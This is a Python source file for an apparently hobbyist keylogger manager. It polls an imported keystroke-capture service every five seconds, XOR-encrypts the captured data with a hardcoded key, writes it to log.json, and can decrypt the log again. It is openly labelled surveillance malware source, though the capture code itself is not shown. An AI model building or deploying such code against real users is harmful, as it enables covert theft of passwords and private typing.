import json
import time
from KeyloggerService import KeyLoggerService
from Encryption import XOREncryption
from KeyloggerAgent.Write import FileWriter




class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        self.__encryption = XOREncryption('0988977872186763')

    def start_listening(self):
        """
        Starts listening and sends the values
        to be written to a json file
        """
        self.service.start_listening()
        print("Keylogger is starting!")
        while True:
            time.sleep(5)
            data = self.service.get_data()
            self._write_to_file(self.encrypt(data),'log.json')

    def stop_listening(self):
        """
         Stops listening to keyboard keys
        """
        self.service.stop_listening()

    def encrypt(self , data: dict) -> dict:
        """
        Takes an unencrypted dictionary
         and returns an encrypted dictionary
        """
        temp_dict = dict()
        for key , val in data.items():
            temp_dict[key] = dict()
            for k , v in val.items():
                 temp_dict[key][k] = self.__encryption.encrypt(v)
        return temp_dict


    def decrypt(self):
        """
        Takes an encrypted json file
         and returns an unencrypted dictionary
        """
        temp_dict = dict()
        data = self.writer.load('log.json')
        for key, val in data.items():
            temp_dict[key] = dict()
            for k, v in val.items():
                temp_dict[key][k] = self.__encryption.decrypt(v)
        return temp_dict

    def _write_to_file(self,data:dict, file_name:str):
        """
        Writes text to a json file
        """
        self.writer.write(data ,file_name)




